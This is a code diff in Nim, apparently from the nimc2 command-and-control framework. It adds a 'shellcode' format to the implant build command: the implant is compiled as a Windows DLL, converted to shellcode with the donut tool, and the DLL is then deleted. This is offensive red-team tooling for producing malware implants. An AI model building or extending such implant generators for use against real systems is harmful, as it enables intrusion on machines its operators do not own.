@@ -1,5 +1,6 @@
 import std/[
   osproc, 
+  os,
   strutils, 
   asyncdispatch, 
   tables
@@ -31,6 +32,12 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
         port = $listener.port.uint
         listenerType = listener.listenerType
 
+
+  var createShellcode = false
+  if format == "shellcode":
+    format = "dll"
+    createShellcode = true
+
   let compileCommand = "nim c -d:client " &
     (if showWindow or format == "dll": "" else: "--app=gui " & " ") & # disable window
     (if format == "dll": "--app=lib --nomain " else: "") & 
@@ -42,15 +49,32 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
     "-d:autoConnectTime=" & autoConnectTime & " " & 
     (if platform == "windows": "-d:mingw " else: "--os:linux ") & 
     (if server.debug: "-d:debug " else: "") & 
+    "-o:implant" & 
+    (
+      if platform == "windows" and format == "dll": ".dll" 
+      elif platform == "windows" and format == "exe": ".exe" 
+      else: ""
+    ) & " " &
     "./src/client/client.nim"
 
-  echo "Running " & compileCommand
-  let exitCode = execCmd(compileCommand)
+  infoLog "Running: " & compileCommand
+  
+  var exitCode = execCmd(compileCommand)
 
   if exitCode != 0:
-    errorLog "failed to build implant, check https://github.com/d4rckh/nimc2/wiki/FAQs"
+    errorLog "failed to compiled implant"
   else:
-    infoLog "saved implant"
+    infoLog "successfully saved implant" & (if createShellcode: ", now building shellcode.." else: "")
+  
+  if not createShellcode: return
+
+  if not fileExists("tools/donut/donut.exe"):
+    errorLog "couldn't find donut at ./tools/donut/donut.exe"
+    return
+
+  exitCode = execCmd("tools/donut/donut.exe -f ./implant.dll")
+
+  removeFile("implant.dll")
 
 let cmd*: Command = Command(
   execProc: execProc,
